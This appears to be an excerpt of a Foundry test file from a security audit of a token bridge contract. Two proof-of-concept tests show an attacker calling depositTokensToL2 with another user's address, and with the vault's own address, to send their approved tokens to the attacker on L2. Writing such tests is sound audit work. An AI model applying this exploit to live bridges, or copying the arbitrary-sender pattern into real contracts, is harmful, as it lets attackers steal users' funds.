...
contract L1BossBridgeTest is Test {
    ...
    function testCanMoveApprovedTokensOfOhterUsers() public {
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        uint depositAmount = token.balanceOf(user);
        address atacker = makeAddr("attacker");

        vm.startPrank(atacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, atacker, depositAmount);
        tokenBridge.depositTokensToL2(user, atacker, depositAmount);
    ...
    function testCanTransferFromVaultToVault() public {
        ...
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), atacker, vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), atacker, vaultBalance);
    }
